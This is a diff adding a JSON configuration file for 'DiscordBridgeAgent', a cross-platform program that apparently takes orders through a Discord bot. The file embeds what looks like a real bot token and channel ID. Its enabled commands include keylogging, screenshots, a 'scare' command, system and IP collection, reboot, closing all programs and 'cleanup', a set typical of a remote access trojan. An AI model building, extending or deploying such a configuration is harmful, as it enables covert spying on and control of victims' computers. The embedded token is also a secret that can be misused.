@@ -1,0 +1,28 @@
+{
+  "discord": {
+    "token": "MTU0Njc2ODkyMDI3NzQyMjEzMQ.Gc49SL.cNmzABaHEA-9WUtWJ0p4NGO9ecUszyEV_Td7cQ",
+    "channel_id": "1483223282718212387"
+
+  },
+  "agent": {
+    "name": "DiscordBridgeAgent",
+    "version": "1.0.0",
+    "platforms": [
+      "Windows",
+      "Linux",
+      "Darwin"
+    ],
+    "enabled_commands": [
+      "help",
+      "screenshot",
+      "scare",
+      "keylog",
+      "systeminfo",
+      "ip",
+      "reboot",
+      "close_all",
+      "cleanup",
+      "info"
+    ]
+  }
+}
